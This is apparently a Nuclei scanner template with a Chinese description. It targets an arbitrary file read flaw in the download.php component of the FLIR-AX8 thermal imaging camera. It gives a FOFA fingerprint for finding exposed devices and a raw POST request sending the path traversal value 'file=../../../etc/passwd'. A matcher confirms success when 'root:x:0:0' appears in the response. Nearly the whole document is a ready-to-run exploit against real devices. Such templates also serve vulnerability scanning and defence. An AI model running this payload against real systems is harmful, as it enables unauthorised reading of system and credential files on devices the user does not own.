id: flir-ax8-downloadphp-lfi

info:
  name: "FLIR-AX8 热成像仪 download.php 组件任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
      FLIR-AX8热成像仪设备中的download.php处理组件存在文件读取权限控制缺陷。攻击者可通过构造恶意请求路径参数，绕过文件访问限制机制，实现对系统任意文件的非授权读取操作。该漏洞可能导致系统配置文件、用户凭证及敏感业务数据泄露，进一步引发横向渗透攻击或服务中断风险。
  tags: FLIR-AX8

http:
- raw:
  - |
    POST /download.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    file=../../../etc/passwd
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'root:x:0:0'
